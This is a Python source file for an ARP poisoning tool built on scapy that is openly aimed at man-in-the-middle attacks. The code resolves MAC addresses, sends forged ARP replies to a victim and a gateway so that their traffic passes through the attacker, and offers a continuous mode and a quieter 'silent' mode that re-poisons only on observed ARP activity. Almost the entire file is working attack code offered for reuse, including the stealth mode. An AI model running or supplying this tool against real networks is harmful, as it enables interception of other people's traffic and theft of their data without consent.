"""
ARP Poisoning module for MITM attacks.

Performs bidirectional ARP spoofing to position the attacker between
victim and gateway, enabling traffic interception.
"""

# mypy: ignore-errors
import threading
import time
from click import style

from scapy.all import (ARP, Ether, sendp, srp, AsyncSniffer, get_if_hwaddr)  # pylint: disable=no-name-in-module,import-error


def resolve_mac(ip: str, iface: str) -> str:
    """Resolve MAC address for a given IP using ARP."""
    print(style(f"Resolving MAC for {ip}...", fg="yellow"))
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=iface,
        verbose=False,
    )
    for _, pkt in ans:
        mac = pkt[Ether].src
        print(style(f"{ip} -> {mac}", fg="yellow"))
        return mac
    raise RuntimeError(f"Could not resolve MAC for {ip}")


class ARPPoisoner:
    """
    Minimal ARP poisoner for victim <-> target MITM.
    
    Supports two modes:
    - all-out: Continuously sends ARP poison packets at specified interval
    - silent: Listens for victim's ARP requests and responds with spoofed replies
    """

    def __init__(
        self, iface: str, victim_ip: str, target_ip: str, interval: float = 2.0, silent: bool = False
    ):
        self.iface = iface
        self.victim_ip = victim_ip
        self.target_ip = target_ip
        self.interval = interval
        self.silent = silent

        self.victim_mac = resolve_mac(victim_ip, iface)
        self.target_mac = resolve_mac(target_ip, iface)
        self.attacker_mac = get_if_hwaddr(iface)

        self._running = False
        self._thread: threading.Thread | None = None
        self._sniffer: AsyncSniffer | None = None

    def _poison_once(self) -> None:
        """Send one round of poison packets to both victim and target."""
        # Tell victim: "target_ip is at attacker MAC"
        eth_to_victim = Ether(dst=self.victim_mac)
        pkt_to_victim = ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,
        )
        sendp(eth_to_victim / pkt_to_victim, iface=self.iface, verbose=False)

        # Tell target: "victim_ip is at attacker MAC"
        eth_to_target = Ether(dst=self.target_mac)
        pkt_to_target = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,
        )
        sendp(eth_to_target / pkt_to_target, iface=self.iface, verbose=False)

    def _restore(self) -> None:
        # print(style("Restoring ARP tables...", fg="yellow"))
        # Restore victim's ARP table: tell victim the correct MAC for target_ip
        eth_to_victim = Ether(dst=self.victim_mac)
        correct_to_victim = ARP(
            op=2,
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac,
        )
        # Restore target's ARP table: tell target the correct MAC for victim_ip
        eth_to_target = Ether(dst=self.target_mac)
        correct_to_target = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.victim_ip,
            hwsrc=self.victim_mac,
        )
        for _ in range(5):
            sendp(eth_to_victim / correct_to_victim, iface=self.iface, verbose=False)
            sendp(eth_to_target / correct_to_target, iface=self.iface, verbose=False)
            time.sleep(0.2)
        print(style("ARP tables restored.", fg="yellow"))

    def _loop(self) -> None:
        """Background poisoning loop. Runs in its own thread."""
        if self.silent:
            self._loop_silent()
        else:
            self._loop_allout()

    def _loop_allout(self) -> None:
        """All-out mode: continuously sends poison packets."""
        # print(f"[+] Interval: {self.interval} seconds")
        try:
            while self._running:
                self._poison_once()
                time.sleep(self.interval)
        finally:
            self._restore()

    def _loop_silent(self) -> None:
        """Silent mode: initial poison, then listen and re-poison only on ARP activity.
        
        This is quieter than continuous spamming - we only send packets when
        we detect ARP traffic that could actually break our MITM position.
        """
        print(style("Silent mode: initial poison, then listening for ARP activity...", fg="yellow"))
        
        # Initial poison to establish MITM (2 packets: 1 to victim, 1 to target)
        self._poison_once()
        print(style("Initial poisoning complete, now listening...", fg="yellow"))
        
        # Only listen for ARP traffic between victim and target
        bpf_filter = (
            f"arp and ("
            f"(src host {self.victim_ip} and dst host {self.target_ip}) or "
            f"(src host {self.target_ip} and dst host {self.victim_ip}) or "
            f"(arp src host {self.victim_ip} and arp dst host {self.target_ip}) or "
            f"(arp src host {self.target_ip} and arp dst host {self.victim_ip})"
            f")"
        )
        
        def on_arp_activity(pkt):
            """Re-poison when we see ARP activity that could affect our MITM."""
            if not self._running:
                return
            
            if not pkt.haslayer(ARP):
                return
            
            arp = pkt[ARP]
            
            # Ignore our own packets (from attacker MAC)
            if pkt.haslayer(Ether) and pkt[Ether].src == self.attacker_mac:
                return
            
            # Only re-poison for direct victim<->target ARP exchanges
            is_victim_to_target = (arp.psrc == self.victim_ip and arp.pdst == self.target_ip)
            is_target_to_victim = (arp.psrc == self.target_ip and arp.pdst == self.victim_ip)
            
            if is_victim_to_target or is_target_to_victim:
                self._poison_once()
                print(style(f"Re-poisoned (ARP: {arp.psrc} -> {arp.pdst})", fg="cyan"))
        
        try:
            self._sniffer = AsyncSniffer(
                iface=self.iface,
                filter=bpf_filter,
                prn=on_arp_activity,
                store=False,
            )
            self._sniffer.start()
            self._sniffer.join()  # Block until sniffer is stopped
        except Exception as e:
            if self._running:
                print(style(f"Sniff error: {e}", fg="red"))
        finally:
            self._sniffer = None
            self._restore()
    
    def start(self) -> None:
        """Start ARP poisoning in a background thread."""
        if self._running:
            print("[*] ARPPoisoner already running.")
            return

        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Request poisoning to stop; thread will restore ARP and exit."""
        if not self._running:
            return
        # print("[*] Stopping ARP poisoning...")
        self._running = False
        # Stop the async sniffer immediately if running
        if self._sniffer is not None:
            self._sniffer.stop()

    def join(self, timeout: float | None = None) -> None:
        """Optionally wait for the background thread to finish."""
        if self._thread is not None:
            self._thread.join(timeout)

    def is_running(self) -> bool:
        """Check if the poisoner is currently running."""
        return self._running


# def listen(
#     victim_ip: str, target_ip: str, iface=["eth0", "eth1"]
# ) -> ARPPoisoner | None:
#     """Listens for incoming ARP packets and checks if the packets originate from the target and are addressed to our victim"""
#     while True:
#         # Wait for an ARP packet
#         pkt = sniff(iface=iface, filter="arp", count=1)

#         # Extract ARP protocol information
#         sniffed = pkt[0][ARP]

#         # Determine whether or not this packet is useful to the attack
#         if sniffed.psrc == victim_ip and sniffed.pdst == target_ip:
#             # If so, return an instance that can be used to poison our target and victim
#             return ARPPoisoner(iface=iface, victim_ip=victim_ip, target_ip=target_ip)
